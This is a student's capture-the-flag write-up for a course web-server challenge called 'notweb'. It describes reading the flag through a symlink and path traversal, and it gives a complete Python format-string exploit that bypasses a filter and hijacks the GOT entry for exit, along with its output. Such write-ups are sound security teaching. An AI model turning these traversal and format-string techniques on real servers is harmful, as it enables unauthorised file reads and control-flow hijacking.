# Write up: notweb (3-2)

## ymli (0016045)

## our task

Try to break the web server (?) and get the flag.


## think out of the box

Actually in this challenge, we can use the shell from other challenges to
create a symlink under `/tmp/` and use notweb to get it.

This idea is from Jeffxx's lecture about his DEFCON experience.

```
ls -l /tmp/tttt/test
lrwxrwxrwx 1 nphw1 nphw1 17 Nov 19 19:04 /tmp/tttt/test -> /home/notweb/flag

$ nc secprog.cs.nctu.edu.tw 10032
GET /../../tmp/tttt/test
HTTP/1.1 200 OK
Content-Length: 42
Content-type: text/plain

SECPROG{But_PWN_!s_e@sier_th@n_WEB_XDDDD}
```

At the first time I came up with this idea, I created the symlink under `/tmp/`
but failed to read it.

Surprisingly, that did work if we create the symlink under some directories in
`/tmp/`.

```
ls -l /tmp/gg
lrwxrwxrwx 1 bof6 bof6 17 Nov 27 21:41 /tmp/gg -> /home/notweb/flag
$ nc secprog.cs.nctu.edu.tw 10032
GET /../../tmp/gg
HTTP/1.1 404 Not Found
Server: notweb
Hint: Try to get this web server!
Content-type: text/html; charset=utf-8

Not found
```

## the real solution

After some analysis of the binary, we can find a format string vulnerability
in function `echo` which will print out the request string.

But we have a filter before the function `echo` all `%` symbols in url will
be filtered to `_`.

Here's a bug in the filter, if the string is long enough, the rest part won't
be modified, therefore, we can just send some garbage bytes first to obtain
more space.

## idea

We use a format string attack approach to accomplish the job.

The format string did two tasks:

1. change the variable `file` to the flag
2. hijack the GOT entry of `exit` to execute function `normal_file` again to 
read the flag.




## exploit

```
#!/usr/bin/python2

import struct
from socket import *
import telnetlib
import re

# try to run the program with gdbserver:5566 over ncat
# bind the programe port to 10032
# ncat -vc 'gdbserver localhost:5566 ./notweb' -kl 10032

# attach to the gdb server
# gdb-peda$ target remote localhost:5566

ip = 'secprog.cs.nctu.edu.tw'
#ip = 'localhost'
port = 10032
soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))

# 0x080637e0 -> file (change to "flag")

# GOT hijacking, replace exit() with normal_file()
# when the program call exit(), it will make EIP point to normal_file() later

# 0x08048c8f -> normal_file
# 0x0804b03c -> exit

payload = "a"*112 + "GET /echo:\xe0\x37\x06\x08" + \
                         "\xe1\x37\x06\x08" + \
                         "\xe2\x37\x06\x08" +\
                         "\xe3\x37\x06\x08" +\
                         "\x3c\xb0\x04\x08" +\
                         "\x3d\xb0\x04\x08" +\
                         "\x3e\xb0\x04\x08" +\
                         "\x3f\xb0\x04\x08" +\
                         "%204c%15$hhn" + \
                         "%6c%16$hhn" + \
                         "%245c%17$hhn" + \
                         "%6c%18$hhn" + \
                         "%40c%19$hhn" + \
                         "%253c%20$hhn" + \
                         "%120c%21$hhn" + \
                         "%4c%22$hhn" + \
                         "\n"
print(len(payload))
soc.send(payload)
print("sent")



# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()
```


## capture the flag

```

$ ./notweb.py 
244
sent
HTTP/1.1 200 OK
Server: notweb
Hint: Try to get this web server!
Content-type: text/html; charset=utf-8

àáâã<=>?_204c_15$hhn_6c_16$hhn_245c_17$hhn_6c_18$hhn_40c_19$hhn_253c_20$hhn_120c_21$hhn_4c_22$hhn
àáâã<=>?                                                                                                                                                                                                           |     z                                                                                                                                                                                                                                                    ð                                            8                                                                                                                                                                                                                                                            (                                                                                                                         |
HTTP/1.1 200 OK
Content-Length: 42
Content-type: text/plain

SECPROG{But_PWN_!s_e@sier_th@n_WEB_XDDDD}
*** Connection closed by remote host ***
```

## lessons learned

1. Advanced skills of format string attack.

2. More ideas about symlinks.

3. GOT hijacking

4. Run the challenge over ncat and use gdb target remote to debug it.


```
# run the challenge over nat
$ ncat -vc 'gdbserver localhost:5566 ./notweb' -kl 10032

# attach to the gdb server
$ gdb -q ./notweb
gdb-peda$ target remote localhost:5566
```
